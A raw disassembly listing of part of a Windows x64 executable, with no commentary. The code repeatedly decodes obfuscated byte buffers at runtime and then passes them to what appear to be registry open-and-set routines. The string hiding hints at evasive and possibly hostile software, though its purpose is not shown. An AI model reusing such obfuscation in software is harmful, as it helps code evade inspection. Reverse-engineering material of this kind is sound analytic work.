   140004b1a:	80 3d 83 bc 2b 00 00 	cmpb   $0x0,0x2bbc83(%rip)        # 0x1402c07a4
   140004b21:	0f 84 ca 00 00 00    	je     0x140004bf1
   140004b27:	66 0f 6f 05 81 6c 00 	movdqa 0x6c81(%rip),%xmm0        # 0x14000b7b0
   140004b2e:	00 
   140004b2f:	66 0f 6f 0d 09 bc 2b 	movdqa 0x2bbc09(%rip),%xmm1        # 0x1402c0740
   140004b36:	00 
   140004b37:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004b3b:	66 0f 6f 15 dd 6a 00 	movdqa 0x6add(%rip),%xmm2        # 0x14000b620
   140004b42:	00 
   140004b43:	66 0f db ca          	pand   %xmm2,%xmm1
   140004b47:	66 0f 7f 0d f1 bb 2b 	movdqa %xmm1,0x2bbbf1(%rip)        # 0x1402c0740
   140004b4e:	00 
   140004b4f:	66 0f 6f 0d f9 bb 2b 	movdqa 0x2bbbf9(%rip),%xmm1        # 0x1402c0750
   140004b56:	00 
   140004b57:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004b5b:	66 0f db ca          	pand   %xmm2,%xmm1
   140004b5f:	66 0f 7f 0d e9 bb 2b 	movdqa %xmm1,0x2bbbe9(%rip)        # 0x1402c0750
   140004b66:	00 
   140004b67:	66 0f 6f 0d f1 bb 2b 	movdqa 0x2bbbf1(%rip),%xmm1        # 0x1402c0760
   140004b6e:	00 
   140004b6f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004b73:	66 0f db ca          	pand   %xmm2,%xmm1
   140004b77:	66 0f 7f 0d e1 bb 2b 	movdqa %xmm1,0x2bbbe1(%rip)        # 0x1402c0760
   140004b7e:	00 
   140004b7f:	66 0f 6f 0d e9 bb 2b 	movdqa 0x2bbbe9(%rip),%xmm1        # 0x1402c0770
   140004b86:	00 
   140004b87:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004b8b:	66 0f db ca          	pand   %xmm2,%xmm1
   140004b8f:	66 0f 7f 0d d9 bb 2b 	movdqa %xmm1,0x2bbbd9(%rip)        # 0x1402c0770
   140004b96:	00 
   140004b97:	66 0f 6f 0d e1 bb 2b 	movdqa 0x2bbbe1(%rip),%xmm1        # 0x1402c0780
   140004b9e:	00 
   140004b9f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004ba3:	66 0f db ca          	pand   %xmm2,%xmm1
   140004ba7:	66 0f 7f 0d d1 bb 2b 	movdqa %xmm1,0x2bbbd1(%rip)        # 0x1402c0780
   140004bae:	00 
   140004baf:	66 0f fd 05 d9 bb 2b 	paddw  0x2bbbd9(%rip),%xmm0        # 0x1402c0790
   140004bb6:	00 
   140004bb7:	66 0f db c2          	pand   %xmm2,%xmm0
   140004bbb:	66 0f 7f 05 cd bb 2b 	movdqa %xmm0,0x2bbbcd(%rip)        # 0x1402c0790
   140004bc2:	00 
   140004bc3:	8b 05 d7 bb 2b 00    	mov    0x2bbbd7(%rip),%eax        # 0x1402c07a0
   140004bc9:	83 c0 0d             	add    $0xd,%eax
   140004bcc:	0f b6 c0             	movzbl %al,%eax
   140004bcf:	66 89 05 ca bb 2b 00 	mov    %ax,0x2bbbca(%rip)        # 0x1402c07a0
   140004bd6:	0f b7 05 c5 bb 2b 00 	movzwl 0x2bbbc5(%rip),%eax        # 0x1402c07a2
   140004bdd:	83 c0 0d             	add    $0xd,%eax
   140004be0:	0f b6 c0             	movzbl %al,%eax
   140004be3:	66 89 05 b8 bb 2b 00 	mov    %ax,0x2bbbb8(%rip)        # 0x1402c07a2
   140004bea:	c6 05 b3 bb 2b 00 00 	movb   $0x0,0x2bbbb3(%rip)        # 0x1402c07a4
   140004bf1:	48 c7 85 d0 16 00 00 	movq   $0x0,0x16d0(%rbp)
   140004bf8:	00 00 00 00 
   140004bfc:	4c 8d 25 3d bb 2b 00 	lea    0x2bbb3d(%rip),%r12        # 0x1402c0740
   140004c03:	4c 89 e1             	mov    %r12,%rcx
   140004c06:	e8 f5 59 00 00       	call   0x14000a600
   140004c0b:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004c12:	01 c0                	add    %eax,%eax
   140004c14:	66 89 8d d2 16 00 00 	mov    %cx,0x16d2(%rbp)
   140004c1b:	66 89 85 d0 16 00 00 	mov    %ax,0x16d0(%rbp)
   140004c22:	4c 89 a5 d8 16 00 00 	mov    %r12,0x16d8(%rbp)
   140004c29:	c7 85 90 16 00 00 30 	movl   $0x30,0x1690(%rbp)
   140004c30:	00 00 00 
   140004c33:	48 c7 85 98 16 00 00 	movq   $0x0,0x1698(%rbp)
   140004c3a:	00 00 00 00 
   140004c3e:	c7 85 a8 16 00 00 40 	movl   $0x40,0x16a8(%rbp)
   140004c45:	00 00 00 
   140004c48:	48 8d 85 d0 16 00 00 	lea    0x16d0(%rbp),%rax
   140004c4f:	48 89 85 a0 16 00 00 	mov    %rax,0x16a0(%rbp)
   140004c56:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004c5a:	f3 41 0f 7f 06       	movdqu %xmm0,(%r14)
   140004c5f:	48 8d 8d e8 16 00 00 	lea    0x16e8(%rbp),%rcx
   140004c66:	4c 8d 85 90 16 00 00 	lea    0x1690(%rbp),%r8
   140004c6d:	ba 03 00 00 00       	mov    $0x3,%edx
   140004c72:	e8 04 c9 ff ff       	call   0x14000157b
   140004c77:	85 c0                	test   %eax,%eax
   140004c79:	79 35                	jns    0x140004cb0
   140004c7b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140004c82:	00 00 
   140004c84:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140004c8b:	00 
   140004c8c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004c93:	00 00 
   140004c95:	48 8d 8d e8 16 00 00 	lea    0x16e8(%rbp),%rcx
   140004c9c:	4c 8d 85 90 16 00 00 	lea    0x1690(%rbp),%r8
   140004ca3:	ba 03 00 00 00       	mov    $0x3,%edx
   140004ca8:	45 31 c9             	xor    %r9d,%r9d
   140004cab:	e8 da c8 ff ff       	call   0x14000158a
   140004cb0:	48 83 bd e8 16 00 00 	cmpq   $0x0,0x16e8(%rbp)
   140004cb7:	00 
   140004cb8:	0f 84 05 01 00 00    	je     0x140004dc3
   140004cbe:	c7 85 40 0e 00 00 01 	movl   $0x1,0xe40(%rbp)
   140004cc5:	00 00 00 
   140004cc8:	80 3d c0 b5 2b 00 00 	cmpb   $0x0,0x2bb5c0(%rip)        # 0x1402c028f
   140004ccf:	0f 84 51 33 00 00    	je     0x140008026
   140004cd5:	80 3d fe ba 2b 00 00 	cmpb   $0x0,0x2bbafe(%rip)        # 0x1402c07da
   140004cdc:	74 78                	je     0x140004d56
   140004cde:	66 0f 6f 05 da 6a 00 	movdqa 0x6ada(%rip),%xmm0        # 0x14000b7c0
   140004ce5:	00 
   140004ce6:	66 0f 6f 0d c2 ba 2b 	movdqa 0x2bbac2(%rip),%xmm1        # 0x1402c07b0
   140004ced:	00 
   140004cee:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004cf2:	66 0f 6f 15 26 69 00 	movdqa 0x6926(%rip),%xmm2        # 0x14000b620
   140004cf9:	00 
   140004cfa:	66 0f db ca          	pand   %xmm2,%xmm1
   140004cfe:	66 0f 7f 0d aa ba 2b 	movdqa %xmm1,0x2bbaaa(%rip)        # 0x1402c07b0
   140004d05:	00 
   140004d06:	66 0f fd 05 b2 ba 2b 	paddw  0x2bbab2(%rip),%xmm0        # 0x1402c07c0
   140004d0d:	00 
   140004d0e:	66 0f db c2          	pand   %xmm2,%xmm0
   140004d12:	66 0f 7f 05 a6 ba 2b 	movdqa %xmm0,0x2bbaa6(%rip)        # 0x1402c07c0
   140004d19:	00 
   140004d1a:	f3 0f 7e 05 ae ba 2b 	movq   0x2bbaae(%rip),%xmm0        # 0x1402c07d0
   140004d21:	00 
   140004d22:	66 0f fd 05 a6 6a 00 	paddw  0x6aa6(%rip),%xmm0        # 0x14000b7d0
   140004d29:	00 
   140004d2a:	66 0f db 05 2e 69 00 	pand   0x692e(%rip),%xmm0        # 0x14000b660
   140004d31:	00 
   140004d32:	66 0f d6 05 96 ba 2b 	movq   %xmm0,0x2bba96(%rip)        # 0x1402c07d0
   140004d39:	00 
   140004d3a:	b8 89 00 00 00       	mov    $0x89,%eax
   140004d3f:	03 05 93 ba 2b 00    	add    0x2bba93(%rip),%eax        # 0x1402c07d8
   140004d45:	0f b6 c0             	movzbl %al,%eax
   140004d48:	66 89 05 89 ba 2b 00 	mov    %ax,0x2bba89(%rip)        # 0x1402c07d8
   140004d4f:	c6 05 84 ba 2b 00 00 	movb   $0x0,0x2bba84(%rip)        # 0x1402c07da
   140004d56:	48 c7 85 60 12 00 00 	movq   $0x0,0x1260(%rbp)
   140004d5d:	00 00 00 00 
   140004d61:	4c 8d 25 48 ba 2b 00 	lea    0x2bba48(%rip),%r12        # 0x1402c07b0
   140004d68:	4c 89 e1             	mov    %r12,%rcx
   140004d6b:	e8 90 58 00 00       	call   0x14000a600
   140004d70:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004d77:	01 c0                	add    %eax,%eax
   140004d79:	66 89 8d 62 12 00 00 	mov    %cx,0x1262(%rbp)
   140004d80:	66 89 85 60 12 00 00 	mov    %ax,0x1260(%rbp)
   140004d87:	4c 89 a5 68 12 00 00 	mov    %r12,0x1268(%rbp)
   140004d8e:	48 8b 8d e8 16 00 00 	mov    0x16e8(%rbp),%rcx
   140004d95:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004d9a:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140004da1:	00 
   140004da2:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004da9:	45 31 c0             	xor    %r8d,%r8d
   140004dac:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140004db2:	e8 2d c8 ff ff       	call   0x1400015e4
   140004db7:	48 8b 8d e8 16 00 00 	mov    0x16e8(%rbp),%rcx
   140004dbe:	e8 9b c6 ff ff       	call   0x14000145e
   140004dc3:	80 3d c6 b4 2b 00 00 	cmpb   $0x0,0x2bb4c6(%rip)        # 0x1402c0290
   140004dca:	0f 84 5a 2a 00 00    	je     0x14000782a
   140004dd0:	80 3d 27 ba 2b 00 00 	cmpb   $0x0,0x2bba27(%rip)        # 0x1402c07fe
   140004dd7:	74 7a                	je     0x140004e53
   140004dd9:	66 0f 6f 05 ff b9 2b 	movdqa 0x2bb9ff(%rip),%xmm0        # 0x1402c07e0
   140004de0:	00 
   140004de1:	66 0f fd 05 07 6a 00 	paddw  0x6a07(%rip),%xmm0        # 0x14000b7f0
   140004de8:	00 
   140004de9:	66 0f db 05 2f 68 00 	pand   0x682f(%rip),%xmm0        # 0x14000b620
   140004df0:	00 
   140004df1:	66 0f 7f 05 e7 b9 2b 	movdqa %xmm0,0x2bb9e7(%rip)        # 0x1402c07e0
   140004df8:	00 
   140004df9:	f3 0f 7e 05 ef b9 2b 	movq   0x2bb9ef(%rip),%xmm0        # 0x1402c07f0
   140004e00:	00 
   140004e01:	66 0f fd 05 f7 69 00 	paddw  0x69f7(%rip),%xmm0        # 0x14000b800
   140004e08:	00 
   140004e09:	66 0f db 05 4f 68 00 	pand   0x684f(%rip),%xmm0        # 0x14000b660
   140004e10:	00 
   140004e11:	66 0f d6 05 d7 b9 2b 	movq   %xmm0,0x2bb9d7(%rip)        # 0x1402c07f0
   140004e18:	00 
   140004e19:	f3 0f 7e 05 d7 b9 2b 	movq   0x2bb9d7(%rip),%xmm0        # 0x1402c07f8
   140004e20:	00 
   140004e21:	66 0f fd 05 e7 69 00 	paddw  0x69e7(%rip),%xmm0        # 0x14000b810
   140004e28:	00 
   140004e29:	66 0f db 05 5f 68 00 	pand   0x685f(%rip),%xmm0        # 0x14000b690
   140004e30:	00 
   140004e31:	66 0f 7e 05 bf b9 2b 	movd   %xmm0,0x2bb9bf(%rip)        # 0x1402c07f8
   140004e38:	00 
   140004e39:	8b 05 bd b9 2b 00    	mov    0x2bb9bd(%rip),%eax        # 0x1402c07fc
   140004e3f:	83 c0 6b             	add    $0x6b,%eax
   140004e42:	0f b6 c0             	movzbl %al,%eax
   140004e45:	66 89 05 b0 b9 2b 00 	mov    %ax,0x2bb9b0(%rip)        # 0x1402c07fc
   140004e4c:	c6 05 ab b9 2b 00 00 	movb   $0x0,0x2bb9ab(%rip)        # 0x1402c07fe
   140004e53:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004e58:	4c 8d 0d 81 b9 2b 00 	lea    0x2bb981(%rip),%r9        # 0x1402c07e0
   140004e5f:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004e66:	b1 01                	mov    $0x1,%cl
   140004e68:	49 89 f8             	mov    %rdi,%r8
   140004e6b:	e8 80 df ff ff       	call   0x140002df0
   140004e70:	80 3d 1a b4 2b 00 00 	cmpb   $0x0,0x2bb41a(%rip)        # 0x1402c0291
   140004e77:	0f 84 0d 2a 00 00    	je     0x14000788a
   140004e7d:	80 3d a6 b9 2b 00 00 	cmpb   $0x0,0x2bb9a6(%rip)        # 0x1402c082a
   140004e84:	74 78                	je     0x140004efe
   140004e86:	66 0f 6f 05 92 69 00 	movdqa 0x6992(%rip),%xmm0        # 0x14000b820
   140004e8d:	00 
   140004e8e:	66 0f 6f 0d 6a b9 2b 	movdqa 0x2bb96a(%rip),%xmm1        # 0x1402c0800
   140004e95:	00 
   140004e96:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004e9a:	66 0f 6f 15 7e 67 00 	movdqa 0x677e(%rip),%xmm2        # 0x14000b620
   140004ea1:	00 
   140004ea2:	66 0f db ca          	pand   %xmm2,%xmm1
   140004ea6:	66 0f 7f 0d 52 b9 2b 	movdqa %xmm1,0x2bb952(%rip)        # 0x1402c0800
   140004ead:	00 
   140004eae:	66 0f fd 05 5a b9 2b 	paddw  0x2bb95a(%rip),%xmm0        # 0x1402c0810
   140004eb5:	00 
   140004eb6:	66 0f db c2          	pand   %xmm2,%xmm0
   140004eba:	66 0f 7f 05 4e b9 2b 	movdqa %xmm0,0x2bb94e(%rip)        # 0x1402c0810
   140004ec1:	00 
   140004ec2:	f3 0f 7e 05 56 b9 2b 	movq   0x2bb956(%rip),%xmm0        # 0x1402c0820
   140004ec9:	00 
   140004eca:	66 0f fd 05 5e 69 00 	paddw  0x695e(%rip),%xmm0        # 0x14000b830
   140004ed1:	00 
   140004ed2:	66 0f db 05 86 67 00 	pand   0x6786(%rip),%xmm0        # 0x14000b660
   140004ed9:	00 
   140004eda:	66 0f d6 05 3e b9 2b 	movq   %xmm0,0x2bb93e(%rip)        # 0x1402c0820
   140004ee1:	00 
   140004ee2:	b8 ad 00 00 00       	mov    $0xad,%eax
   140004ee7:	03 05 3b b9 2b 00    	add    0x2bb93b(%rip),%eax        # 0x1402c0828
   140004eed:	0f b6 c0             	movzbl %al,%eax
   140004ef0:	66 89 05 31 b9 2b 00 	mov    %ax,0x2bb931(%rip)        # 0x1402c0828
   140004ef7:	c6 05 2c b9 2b 00 00 	movb   $0x0,0x2bb92c(%rip)        # 0x1402c082a
   140004efe:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004f03:	4c 8d 0d f6 b8 2b 00 	lea    0x2bb8f6(%rip),%r9        # 0x1402c0800
   140004f0a:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004f11:	b1 01                	mov    $0x1,%cl
   140004f13:	49 89 f8             	mov    %rdi,%r8
   140004f16:	e8 d5 de ff ff       	call   0x140002df0
   140004f1b:	80 3d 70 b3 2b 00 00 	cmpb   $0x0,0x2bb370(%rip)        # 0x1402c0292
   140004f22:	0f 84 93 29 00 00    	je     0x1400078bb
   140004f28:	80 3d 23 b9 2b 00 00 	cmpb   $0x0,0x2bb923(%rip)        # 0x1402c0852
   140004f2f:	74 56                	je     0x140004f87
   140004f31:	66 0f 6f 05 07 69 00 	movdqa 0x6907(%rip),%xmm0        # 0x14000b840
   140004f38:	00 
   140004f39:	66 0f 6f 0d ef b8 2b 	movdqa 0x2bb8ef(%rip),%xmm1        # 0x1402c0830
   140004f40:	00 
   140004f41:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004f45:	66 0f 6f 15 d3 66 00 	movdqa 0x66d3(%rip),%xmm2        # 0x14000b620
   140004f4c:	00 
   140004f4d:	66 0f db ca          	pand   %xmm2,%xmm1
   140004f51:	66 0f 7f 0d d7 b8 2b 	movdqa %xmm1,0x2bb8d7(%rip)        # 0x1402c0830
   140004f58:	00 
   140004f59:	66 0f fd 05 df b8 2b 	paddw  0x2bb8df(%rip),%xmm0        # 0x1402c0840
   140004f60:	00 
   140004f61:	66 0f db c2          	pand   %xmm2,%xmm0
   140004f65:	66 0f 7f 05 d3 b8 2b 	movdqa %xmm0,0x2bb8d3(%rip)        # 0x1402c0840
   140004f6c:	00 
   140004f6d:	8b 05 dd b8 2b 00    	mov    0x2bb8dd(%rip),%eax        # 0x1402c0850
   140004f73:	83 c0 69             	add    $0x69,%eax
   140004f76:	0f b6 c0             	movzbl %al,%eax
   140004f79:	66 89 05 d0 b8 2b 00 	mov    %ax,0x2bb8d0(%rip)        # 0x1402c0850
   140004f80:	c6 05 cb b8 2b 00 00 	movb   $0x0,0x2bb8cb(%rip)        # 0x1402c0852
   140004f87:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004f8c:	4c 8d 0d 9d b8 2b 00 	lea    0x2bb89d(%rip),%r9        # 0x1402c0830
   140004f93:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004f9a:	b1 01                	mov    $0x1,%cl
   140004f9c:	49 89 f8             	mov    %rdi,%r8
   140004f9f:	e8 4c de ff ff       	call   0x140002df0
   140004fa4:	80 3d e8 b2 2b 00 00 	cmpb   $0x0,0x2bb2e8(%rip)        # 0x1402c0293
   140004fab:	0f 84 3b 29 00 00    	je     0x1400078ec
   140004fb1:	80 3d c2 b8 2b 00 00 	cmpb   $0x0,0x2bb8c2(%rip)        # 0x1402c087a
   140004fb8:	74 5a                	je     0x140005014
   140004fba:	66 0f 6f 05 9e b8 2b 	movdqa 0x2bb89e(%rip),%xmm0        # 0x1402c0860
   140004fc1:	00 
   140004fc2:	66 0f fd 05 96 68 00 	paddw  0x6896(%rip),%xmm0        # 0x14000b860
   140004fc9:	00 
   140004fca:	66 0f db 05 4e 66 00 	pand   0x664e(%rip),%xmm0        # 0x14000b620
   140004fd1:	00 
   140004fd2:	66 0f 7f 05 86 b8 2b 	movdqa %xmm0,0x2bb886(%rip)        # 0x1402c0860
   140004fd9:	00 
   140004fda:	f3 0f 7e 05 8e b8 2b 	movq   0x2bb88e(%rip),%xmm0        # 0x1402c0870
   140004fe1:	00 
   140004fe2:	66 0f fd 05 86 68 00 	paddw  0x6886(%rip),%xmm0        # 0x14000b870
   140004fe9:	00 
   140004fea:	66 0f db 05 6e 66 00 	pand   0x666e(%rip),%xmm0        # 0x14000b660
   140004ff1:	00 
   140004ff2:	66 0f d6 05 76 b8 2b 	movq   %xmm0,0x2bb876(%rip)        # 0x1402c0870
   140004ff9:	00 
   140004ffa:	8b 05 78 b8 2b 00    	mov    0x2bb878(%rip),%eax        # 0x1402c0878
   140005000:	83 c0 5d             	add    $0x5d,%eax
   140005003:	0f b6 c0             	movzbl %al,%eax
   140005006:	66 89 05 6b b8 2b 00 	mov    %ax,0x2bb86b(%rip)        # 0x1402c0878
   14000500d:	c6 05 66 b8 2b 00 00 	movb   $0x0,0x2bb866(%rip)        # 0x1402c087a
   140005014:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005019:	4c 8d 0d 40 b8 2b 00 	lea    0x2bb840(%rip),%r9        # 0x1402c0860
   140005020:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140005027:	b1 01                	mov    $0x1,%cl
   140005029:	49 89 f8             	mov    %rdi,%r8
   14000502c:	e8 bf dd ff ff       	call   0x140002df0
   140005031:	80 3d 5c b2 2b 00 00 	cmpb   $0x0,0x2bb25c(%rip)        # 0x1402c0294
   140005038:	0f 84 04 29 00 00    	je     0x140007942
   14000503e:	80 3d 57 b8 2b 00 00 	cmpb   $0x0,0x2bb857(%rip)        # 0x1402c089c
   140005045:	74 67                	je     0x1400050ae
   140005047:	66 0f 6f 05 31 b8 2b 	movdqa 0x2bb831(%rip),%xmm0        # 0x1402c0880
   14000504e:	00 
   14000504f:	66 0f fd 05 39 68 00 	paddw  0x6839(%rip),%xmm0        # 0x14000b890
   140005056:	00 
   140005057:	66 0f db 05 c1 65 00 	pand   0x65c1(%rip),%xmm0        # 0x14000b620
   14000505e:	00 
   14000505f:	66 0f 7f 05 19 b8 2b 	movdqa %xmm0,0x2bb819(%rip)        # 0x1402c0880
   140005066:	00 
   140005067:	f3 0f 7e 05 21 b8 2b 	movq   0x2bb821(%rip),%xmm0        # 0x1402c0890
   14000506e:	00 
   14000506f:	66 0f fd 05 29 68 00 	paddw  0x6829(%rip),%xmm0        # 0x14000b8a0
   140005076:	00 
   140005077:	66 0f db 05 e1 65 00 	pand   0x65e1(%rip),%xmm0        # 0x14000b660
   14000507e:	00 
   14000507f:	66 0f d6 05 09 b8 2b 	movq   %xmm0,0x2bb809(%rip)        # 0x1402c0890
   140005086:	00 
   140005087:	f3 0f 7e 05 09 b8 2b 	movq   0x2bb809(%rip),%xmm0        # 0x1402c0898
   14000508e:	00 
   14000508f:	66 0f fd 05 19 68 00 	paddw  0x6819(%rip),%xmm0        # 0x14000b8b0
   140005096:	00 
   140005097:	66 0f db 05 f1 65 00 	pand   0x65f1(%rip),%xmm0        # 0x14000b690
   14000509e:	00 
   14000509f:	66 0f 7e 05 f1 b7 2b 	movd   %xmm0,0x2bb7f1(%rip)        # 0x1402c0898
   1400050a6:	00 
   1400050a7:	c6 05 ee b7 2b 00 00 	movb   $0x0,0x2bb7ee(%rip)        # 0x1402c089c
   1400050ae:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400050b3:	4c 8d 0d c6 b7 2b 00 	lea    0x2bb7c6(%rip),%r9        # 0x1402c0880
   1400050ba:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400050c1:	b1 01                	mov    $0x1,%cl
   1400050c3:	49 89 f8             	mov    %rdi,%r8
   1400050c6:	e8 25 dd ff ff       	call   0x140002df0
   1400050cb:	80 3d c3 b1 2b 00 00 	cmpb   $0x0,0x2bb1c3(%rip)        # 0x1402c0295
   1400050d2:	0f 84 c1 28 00 00    	je     0x140007999
   1400050d8:	80 3d 37 b8 2b 00 00 	cmpb   $0x0,0x2bb837(%rip)        # 0x1402c0916
   1400050df:	0f 84 f5 00 00 00    	je     0x1400051da
   1400050e5:	66 0f 6f 05 d3 67 00 	movdqa 0x67d3(%rip),%xmm0        # 0x14000b8c0
   1400050ec:	00 
   1400050ed:	66 0f 6f 15 ab b7 2b 	movdqa 0x2bb7ab(%rip),%xmm2        # 0x1402c08a0
   1400050f4:	00 
   1400050f5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400050f9:	66 0f 6f 0d 1f 65 00 	movdqa 0x651f(%rip),%xmm1        # 0x14000b620
   140005100:	00 
   140005101:	66 0f db d1          	pand   %xmm1,%xmm2
   140005105:	66 0f 7f 15 93 b7 2b 	movdqa %xmm2,0x2bb793(%rip)        # 0x1402c08a0
   14000510c:	00 
   14000510d:	66 0f 6f 15 9b b7 2b 	movdqa 0x2bb79b(%rip),%xmm2        # 0x1402c08b0
   140005114:	00 
   140005115:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005119:	66 0f db d1          	pand   %xmm1,%xmm2
   14000511d:	66 0f 7f 15 8b b7 2b 	movdqa %xmm2,0x2bb78b(%rip)        # 0x1402c08b0
   140005124:	00 
   140005125:	66 0f 6f 15 93 b7 2b 	movdqa 0x2bb793(%rip),%xmm2        # 0x1402c08c0
   14000512c:	00 
   14000512d:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005131:	66 0f db d1          	pand   %xmm1,%xmm2
   140005135:	66 0f 7f 15 83 b7 2b 	movdqa %xmm2,0x2bb783(%rip)        # 0x1402c08c0
   14000513c:	00 
   14000513d:	66 0f 6f 15 8b b7 2b 	movdqa 0x2bb78b(%rip),%xmm2        # 0x1402c08d0
   140005144:	00 
   140005145:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005149:	66 0f db d1          	pand   %xmm1,%xmm2
   14000514d:	66 0f 7f 15 7b b7 2b 	movdqa %xmm2,0x2bb77b(%rip)        # 0x1402c08d0
   140005154:	00 
   140005155:	66 0f 6f 15 83 b7 2b 	movdqa 0x2bb783(%rip),%xmm2        # 0x1402c08e0
   14000515c:	00 
   14000515d:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005161:	66 0f db d1          	pand   %xmm1,%xmm2
   140005165:	66 0f 7f 15 73 b7 2b 	movdqa %xmm2,0x2bb773(%rip)        # 0x1402c08e0
   14000516c:	00 
   14000516d:	66 0f 6f 15 7b b7 2b 	movdqa 0x2bb77b(%rip),%xmm2        # 0x1402c08f0
   140005174:	00 
   140005175:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005179:	66 0f db d1          	pand   %xmm1,%xmm2
   14000517d:	66 0f 7f 15 6b b7 2b 	movdqa %xmm2,0x2bb76b(%rip)        # 0x1402c08f0
   140005184:	00 
   140005185:	66 0f fd 05 73 b7 2b 	paddw  0x2bb773(%rip),%xmm0        # 0x1402c0900
   14000518c:	00 
   14000518d:	66 0f db c1          	pand   %xmm1,%xmm0
   140005191:	66 0f 7f 05 67 b7 2b 	movdqa %xmm0,0x2bb767(%rip)        # 0x1402c0900
   140005198:	00 
   140005199:	8b 05 71 b7 2b 00    	mov    0x2bb771(%rip),%eax        # 0x1402c0910
   14000519f:	83 c0 6f             	add    $0x6f,%eax
   1400051a2:	0f b6 c0             	movzbl %al,%eax
   1400051a5:	66 89 05 64 b7 2b 00 	mov    %ax,0x2bb764(%rip)        # 0x1402c0910
   1400051ac:	0f b7 05 5f b7 2b 00 	movzwl 0x2bb75f(%rip),%eax        # 0x1402c0912
   1400051b3:	83 c0 6f             	add    $0x6f,%eax
   1400051b6:	0f b6 c0             	movzbl %al,%eax
   1400051b9:	66 89 05 52 b7 2b 00 	mov    %ax,0x2bb752(%rip)        # 0x1402c0912
   1400051c0:	8b 05 4e b7 2b 00    	mov    0x2bb74e(%rip),%eax        # 0x1402c0914
   1400051c6:	83 c0 6f             	add    $0x6f,%eax
   1400051c9:	0f b6 c0             	movzbl %al,%eax
   1400051cc:	66 89 05 41 b7 2b 00 	mov    %ax,0x2bb741(%rip)        # 0x1402c0914
   1400051d3:	c6 05 3c b7 2b 00 00 	movb   $0x0,0x2bb73c(%rip)        # 0x1402c0916
   1400051da:	80 3d b5 b0 2b 00 00 	cmpb   $0x0,0x2bb0b5(%rip)        # 0x1402c0296
   1400051e1:	0f 84 53 28 00 00    	je     0x140007a3a
   1400051e7:	80 3d 48 b7 2b 00 00 	cmpb   $0x0,0x2bb748(%rip)        # 0x1402c0936
   1400051ee:	74 5a                	je     0x14000524a
   1400051f0:	66 0f 6f 05 28 b7 2b 	movdqa 0x2bb728(%rip),%xmm0        # 0x1402c0920
   1400051f7:	00 
   1400051f8:	66 0f fd 05 c0 66 00 	paddw  0x66c0(%rip),%xmm0        # 0x14000b8c0
   1400051ff:	00 
   140005200:	66 0f db 05 18 64 00 	pand   0x6418(%rip),%xmm0        # 0x14000b620
   140005207:	00 
   140005208:	66 0f 7f 05 10 b7 2b 	movdqa %xmm0,0x2bb710(%rip)        # 0x1402c0920
   14000520f:	00 
   140005210:	66 0f 6f 05 18 b7 2b 	movdqa 0x2bb718(%rip),%xmm0        # 0x1402c0930
   140005217:	00 
   140005218:	66 0f fd 05 c0 66 00 	paddw  0x66c0(%rip),%xmm0        # 0x14000b8e0
   14000521f:	00 
   140005220:	66 0f db 05 68 64 00 	pand   0x6468(%rip),%xmm0        # 0x14000b690
   140005227:	00 
   140005228:	66 0f 7e 05 00 b7 2b 	movd   %xmm0,0x2bb700(%rip)        # 0x1402c0930
   14000522f:	00 
   140005230:	8b 05 fe b6 2b 00    	mov    0x2bb6fe(%rip),%eax        # 0x1402c0934
   140005236:	83 c0 6f             	add    $0x6f,%eax
   140005239:	0f b6 c0             	movzbl %al,%eax
   14000523c:	66 89 05 f1 b6 2b 00 	mov    %ax,0x2bb6f1(%rip)        # 0x1402c0934
   140005243:	c6 05 ec b6 2b 00 00 	movb   $0x0,0x2bb6ec(%rip)        # 0x1402c0936
   14000524a:	48 8d 0d 4f b6 2b 00 	lea    0x2bb64f(%rip),%rcx        # 0x1402c08a0
   140005251:	48 8d 15 c8 b6 2b 00 	lea    0x2bb6c8(%rip),%rdx        # 0x1402c0920
   140005258:	e8 83 e6 ff ff       	call   0x1400038e0
   14000525d:	80 3d 33 b0 2b 00 00 	cmpb   $0x0,0x2bb033(%rip)        # 0x1402c0297
   140005264:	0f 84 1f 28 00 00    	je     0x140007a89
   14000526a:	80 3d 51 b7 2b 00 00 	cmpb   $0x0,0x2bb751(%rip)        # 0x1402c09c2
   140005271:	0f 84 e6 00 00 00    	je     0x14000535d
   140005277:	66 0f 6f 05 71 66 00 	movdqa 0x6671(%rip),%xmm0        # 0x14000b8f0
   14000527e:	00 
   14000527f:	66 0f 6f 15 b9 b6 2b 	movdqa 0x2bb6b9(%rip),%xmm2        # 0x1402c0940
   140005286:	00 
   140005287:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000528b:	66 0f 6f 0d 8d 63 00 	movdqa 0x638d(%rip),%xmm1        # 0x14000b620
